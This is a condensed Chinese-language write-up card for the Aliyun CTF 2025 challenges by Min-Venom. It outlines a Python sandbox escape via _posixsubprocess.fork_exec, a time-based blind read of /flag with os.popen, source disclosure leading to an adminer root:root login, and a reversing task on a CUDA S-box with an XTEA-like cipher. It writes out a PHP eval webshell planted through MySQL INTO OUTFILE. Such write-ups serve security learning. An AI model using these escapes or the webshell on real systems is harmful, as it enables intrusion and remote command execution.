---
title: "阿里云 CTF 2025 WriteUp by Min-Venom"
category: misc
tags: ["阿里云CTF", "misc", "Python-jail", "_posixsubprocess", "time-blind-injection", "source-disclosure"]
signals: ["阿里云CTF 2025", "Python-jail", "_posixsubprocess", "time-blind-injection", "source-disclosure", "adminer", "MySQL-into-outfile", "CUDA-PTX", "S-box", "misc_unknown", "Python", "posixsubprocess", "CUDA", "XTEA-like"]
difficulty: medium
source: "https://www.ctfiot.com/229032.html"
tools: ["Python"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 阿里云 CTF 2025 WriteUp by Min-Venom

> 赛事：阿里云CTF 2025 | 方向：misc | 难度：medium | 工具：Python

## 一句话总结

阿里云 2025：Python _posixsubprocess 沙箱逃逸 + 时间盲注 + adminer 数据库写马 + CUDA S-box + XTEA-like 加密。

## 攻击链

1. Web ezoj: _posixsubprocess.fork_exec 绕过 Python 沙箱执行 /bin/sh
2. 时间盲注: 写 /tmp/1.py → if os.popen(''cat /flag*'').read()[i-1]==''j'': time.sleep(2)
3. base64 编码 payload 注入到 echo 'poc2'|base64 -d > /tmp/1.py
4. payload 1: 触发 /tmp/1.py 执行 + 测量响应时间
5. flag = aliyunctf{bb050a11-f64e-4137-8e94-59a37b0ed427}
6. 打卡 OK: login.php~ 源码 + adminer_481.php 数据库直连
7. 登录 root:root 写 shell.php: SELECT "<?php eval($_POST[''cmd'']);?>" INTO OUTFILE "/var/www/html/shell.php
8. RE easy-cuda-rev: dump PTX 提取 256 字节 S-box T
9. 加密循环: nibble swap (rs17<<4)|(rs17>>4) + S-box + XOR i
10. 5 个相同循环（外层 10485760 次）+ XTEA-like 加密 8 轮 4 delta
11. delta: 1013904242 (r253), 338241895 (k0), 1013904242 (k2), 939442524 (k1), 1556008596 (k3)
12. 逆逻辑: 先逆 XTEA-like 8 轮，再逆 5 个 10485760 循环，再逆 nibble swap

## 关键 payload

```
_posixsubprocess.fork_exec + 时间盲注 + adminer root:root + CUDA S-box + XTEA-like 8 轮
```

## 经验教训

_posixsubprocess.fork_exec 是 Python 沙箱逃逸的隐藏口子；MySQL root:root 默认密码是经典踩点；CUDA PTX 逆向核心是提取常量 S-box。

## 标签

Python-jail、_posixsubprocess、time-blind-injection、source-disclosure、adminer、MySQL-into-outfile、CUDA-PTX、S-box、TEA-cipher、sandbox-bypass

## 参考来源

- https://www.ctfiot.com/229032.html
- 原文件：阿里云CTF2025_writeup_by_Min-Venom.full.md
